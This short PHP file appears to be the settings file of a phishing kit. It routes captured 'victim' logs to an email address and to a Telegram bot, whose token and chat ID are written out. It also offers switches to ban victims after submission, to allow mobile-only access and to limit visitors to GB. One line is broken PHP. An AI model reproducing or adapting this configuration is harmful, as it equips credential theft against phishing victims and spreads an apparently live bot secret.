<?php
$rand_hash = md5($_SERVER['REMOTE_ADDR']);
$session = md5(rand(100, 999));



// E-mail Settings
$sendLog = 1; // 0 = Disabled || 1 = Enabled
$EMAIL = "elymas2409@GMAIL.COM"; // Your e-mail here

// Telegram Settings
$telegram = 10000;
$token = "7915597361:AAEL0qP3o5lERMliSGejseHN2H8W_4D0SnM"; 
$chatID = "-1002475696720";

// Save to file
$saveLog = @; // Save the Logs to file

// Settings
$oneTime = 0; // One Time Mode: Ban victim from accessing the page after completing
$mobileOnly = 0; // The victims can access only from their phone.
$source_folder = "f";

// Country Settings
$country_check = 0;
$countries_allowed = ['GB'];





function now() {
    date_default_timezone_set('GMT');
    return date("d/m/Y h:i:sa");
}
?>
